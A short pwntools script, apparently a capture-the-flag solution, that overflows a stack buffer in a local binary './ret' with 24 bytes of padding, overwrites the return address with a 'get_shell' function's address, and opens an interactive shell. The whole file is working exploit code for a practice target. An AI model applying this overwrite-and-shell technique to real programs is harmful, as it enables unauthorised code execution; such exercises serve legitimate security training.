from pwn import*

context.log_level = 'debug'
p = process('./ret')
elf = ELF('./ret')

sh = elf.symbols['get_shell']
payload = b'a'*16
payload += b'b'*8
payload += p64(sh)
p.send(payload)

p.interactive()
